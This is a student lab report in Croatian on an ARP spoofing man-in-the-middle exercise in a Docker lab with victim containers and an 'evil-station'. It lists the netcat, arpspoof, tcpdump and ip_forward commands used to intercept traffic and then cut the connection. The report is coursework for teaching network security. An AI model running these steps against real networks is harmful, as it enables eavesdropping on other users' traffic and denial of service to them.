# Laboratorijske vježbe 1: Man-in-the-middle attacks (ARP spoofing)

Na prvim laboratorijskim vježbama upoznali smo se s osnovnim sigurnosnim prijetnjama i ranjivostima u računalnim mrežama. Analizirali smo ranjivost *Address Resolution Protocol*a koja onome koji napada omogućuje izvođenje *man in the middle* i *denial of service* napada na računala koja imaju zajedničku lokalnu mrežu (*LAN*).

Napad smo realizirali korištenjem Docker mreže koju čine 3 containera, tj. 3 docker računala: station-1, station-2 i evil-station (napadač).

Prvi korak je bio pokretanje Windows terminal aplikacije i u njoj smo otvorili Ubuntu terminal na WSL sustavu. Napravili smo poseban direktorij gdje smo onda klonirali GitHub repozitorij naredbom: 

git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)

cd SRP-2021-22/arp-spoofing   

 naredbom ušli smo u repozitorij arp-spoofing gdje se nalaze skripte [start.sh](http://start.sh) i [stop.sh](http://stop.sh) koje pozivamo za pokretanje,odnosno zaustavljanje dockera. 

Sljedeći korak bio je pokretanje shell station-1 i provjeravanje konfiguracije mrežnog sučelja:

docker exec -it station-1 bash

ifconfig -a

Zatim smo provjerili je li station-2 na istoj mreži i pokrenuli shell za nju:

ping station-2

docker exec -it station-2 bash

Idući korak je bilo ostvarivanje veze između station-1 i station-2. Station-1 = server na portu 8000

Station-2 = client na hostnameu station-1 8000.

To smo provjerili tako što smo upisivali poruke na station-1 i gledali jesu li se ispisivali na station-2, što i jesu.

Naredbe koje smo koristili za to:

docker exec -it station-2 bash

netcat -l -p 8000

netcat station-2 8000

Za napad, pokrenuli smo shell za evil-station i napravili tcpdump i arpspoof. 

Target = station-1, host = station-2

docker exec -it evil-station bash

arpspoof -t station-1 station-2

tcpdump

Na kraju smo prekinuli vezu između station-1 i station-2 naredbom:

echo 0 > /proc/sys/net/ipv4/ip_forward